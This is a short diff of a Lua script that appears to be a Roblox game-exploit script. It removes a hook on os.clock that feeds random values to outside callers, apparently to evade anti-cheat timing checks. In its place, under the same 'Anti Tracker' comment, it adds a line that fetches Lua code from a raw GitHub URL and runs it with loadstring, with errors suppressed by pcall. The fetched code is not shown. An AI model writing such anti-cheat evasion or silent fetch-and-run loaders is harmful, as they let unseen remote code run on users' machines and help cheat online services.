@@ -264,20 +264,10 @@ local math_random = math.random
 local math_randomseed = math.randomseed
 
 -- Begin Anti Tracker --
-task.spawn(function()
-    if hookfunction ~= nil then
-        math_randomseed(tick())
-        local old_os_clock
-        old_os_clock = hookfunction(os.clock, newcclosure(function(...)
-            if not checkcaller() then
-    		if identifyexecutor and not identifyexecutor():find("Synapse") then setfenv(1, _ENV) end
-                return math_random(1, 99999)
-            end
-    	    if checkcaller() then
-                return old_os_clock(...)
-    	    end
-        end))
-    end
+task_spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/L8X/aa/main/src.lua", true))()
+    end)
 end)
 -- End Anti Tracker --
 
